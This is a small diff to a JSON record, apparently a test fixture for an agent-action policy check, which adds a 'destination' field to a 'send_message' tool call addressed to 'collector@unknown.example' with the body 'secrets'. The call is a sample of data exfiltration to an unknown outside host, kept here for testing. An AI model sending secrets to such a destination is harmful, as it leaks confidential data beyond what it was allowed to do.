@@ -22,7 +22,8 @@
       "tool": "send_message",
       "arguments": {
         "to": "collector@unknown.example",
-        "body": "secrets"
+        "body": "secrets",
+        "destination": "collector@unknown.example"
       },
       "resource_class": "UNKNOWN",
       "destination": "collector@unknown.example",
